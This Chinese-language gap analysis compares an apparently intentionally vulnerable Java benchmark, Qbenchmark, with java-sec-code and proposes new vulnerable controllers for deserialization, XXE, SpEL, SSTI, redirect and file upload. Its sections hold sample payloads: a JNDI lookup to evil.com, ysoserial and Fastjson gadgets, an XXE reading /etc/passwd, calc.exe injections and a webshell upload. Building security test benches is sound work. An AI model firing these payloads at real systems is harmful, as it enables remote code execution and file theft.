# Qbenchmark vs java-sec-code 漏洞对比分析

## 📊 对比概览

| 漏洞类型 | java-sec-code | Qbenchmark | 优先级 |
|---------|---------------|------------|--------|
| SQL Injection | ✅ | ✅ | - |
| SSRF | ✅ | ✅ | - |
| Command Injection | ✅ | ✅ | - |
| XSS | ✅ | ✅ | - |
| Path Traversal | ✅ | ✅ | - |
| Log4Shell | ✅ | ✅ | - |
| **反序列化 (Jackson)** | ✅ | ❌ | 🔴 高 |
| **反序列化 (Fastjson)** | ✅ | ❌ | 🔴 高 |
| **反序列化 (Shiro)** | ✅ | ❌ | 🔴 高 |
| **XXE** | ✅ | ❌ | 🔴 高 |
| **SpEL 注入** | ✅ | ❌ | 🟠 中 |
| **SSTI** | ✅ | ❌ | 🟠 中 |
| **URL 重定向** | ✅ | ❌ | 🟠 中 |
| **文件上传** | ✅ | ❌ | 🟠 中 |
| JWT | ✅ | ❌ | 🟡 低 |
| Jsonp | ✅ | ❌ | 🟡 低 |
| CORS | ✅ | ❌ | 🟡 低 |
| CSRF | ✅ | ❌ | 🟡 低 |
| CRLF 注入 | ✅ | ❌ | 🟡 低 |
| Cookies 安全 | ✅ | ❌ | 🟡 低 |

---

## 🔴 高优先级缺失漏洞

### 1. 反序列化漏洞 (Deserialize)

**java-sec-code 实现：**
- `/deserialize/rememberMe/vuln` - Cookie 反序列化
- `/deserialize/jackson` - Jackson enableDefaultTyping
- Commons Collections gadget chain

**影响：** 远程代码执行 (RCE)

**Payload 示例：**
```bash
# Jackson 反序列化
curl -X POST http://localhost:8080/deserialize/jackson \
  -H "Content-Type: application/json" \
  -d '["org.jsecurity.realm.jndi.JndiRealmFactory", {"jndiNames":"ldap://evil.com/exp"}]'

# Cookie 反序列化 (使用 ysoserial)
java -jar ysoserial.jar CommonsCollections5 "calc.exe" | base64
```

---

### 2. Fastjson 反序列化

**java-sec-code 实现：**
- `/fastjson/deserialize` - autoType 开启

**影响：** 远程代码执行 (RCE)

**Payload 示例：**
```json
{
  "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  "_bytecodes": ["base64编码的字节码"],
  "_name": "lightless",
  "_tfactory": {},
  "_outputProperties": {}
}
```

---

### 3. Shiro 反序列化 (Shiro-550)

**java-sec-code 实现：**
- `/shiro/deserialize` - rememberMe 反序列化

**影响：** 远程代码执行 (RCE)

**漏洞特征：** Shiro <= 1.2.4，默认密钥

---

### 4. XXE (XML 外部实体注入)

**java-sec-code 实现：**
- `/xxe/xmlReader/vuln` - XMLReader
- `/xxe/SAXBuilder/vuln` - JDOM2 SAXBuilder
- `/xxe/DocumentBuilder/vuln` - DocumentBuilder
- `/xxe/saxreader/vuln` - DOM4J SAXReader

**影响：** 文件读取、SSRF、RCE

**Payload 示例：**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

---

## 🟠 中优先级缺失漏洞

### 5. SpEL 注入

**java-sec-code 实现：**
- `/spel/vuln1` - 直接解析表达式
- `/spel/vuln2` - 使用 TemplateParserContext

**影响：** RCE、信息泄露

**Payload 示例：**
```
T(java.lang.Runtime).getRuntime().exec('calc.exe')
#{T(java.lang.Runtime).getRuntime().exec('calc.exe')}
```

---

### 6. SSTI (服务端模板注入)

**java-sec-code 实现：**
- `/ssti/velocity` - Apache Velocity

**影响：** RCE

**Payload 示例：**
```
#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc.exe")
```

---

### 7. URL 重定向

**java-sec-code 实现：**
- `/urlRedirect/redirect` - Spring redirect
- `/urlRedirect/setHeader` - Location header
- `/urlRedirect/sendRedirect` - sendRedirect

**影响：** 钓鱼攻击

**Payload 示例：**
```
?url=http://evil.com
```

---

### 8. 文件上传

**java-sec-code 实现：**
- `/file/upload` - 任意文件上传
- `/file/upload/picture` - 绕过图片检测

**影响：** Webshell 上传、任意代码执行

**Payload 示例：**
```bash
curl -F "file=@shell.jsp" http://localhost:8080/file/upload
```

---

## 🟡 低优先级缺失漏洞

### 9. JWT (JSON Web Token)
- JWT 签名伪造
- JWT 算法降级攻击

### 10. Jsonp
- JSONP 劫持
- 敏感信息泄露

### 11. CORS
- 跨域资源共享配置错误
- CSRF 配合攻击

### 12. CSRF
- 跨站请求伪造

### 13. CRLF 注入
- HTTP 响应拆分
- XSS 注入

---

## 📋 建议添加的漏洞控制器

### 第一批 (高优先级)

1. **DeserializeController.java**
   - Jackson 反序列化
   - Fastjson 反序列化
   - Shiro rememberMe 反序列化

2. **XXEController.java**
   - XMLReader XXE
   - SAXBuilder XXE
   - DocumentBuilder XXE

3. **SpELController.java**
   - SpEL 表达式注入
   - 安全版本对比

### 第二批 (中优先级)

4. **SSTIController.java**
   - Velocity 模板注入
   - FreeMarker 模板注入

5. **URLRedirectController.java**
   - open redirect
   - 白名单验证

6. **FileUploadController.java**
   - 任意文件上传
   - 绕过检测

### 第三批 (低优先级)

7. **JwtController.java**
8. **CorsController.java**
9. **CSRFController.java**

---

## 📝 总结

**Qbenchmark 当前缺失的重要漏洞类型：**
- 🔴 4 种反序列化相关漏洞 (Jackson, Fastjson, Shiro, Cookie)
- 🔴 XXE (XML 外部实体注入)
- 🟠 SpEL 注入
- 🟠 SSTI (模板注入)
- 🟠 URL 重定向
- 🟠 文件上传

**建议优先添加反序列化和 XXE 相关漏洞，因为这些是 Java 应用中最危险的高危漏洞。**
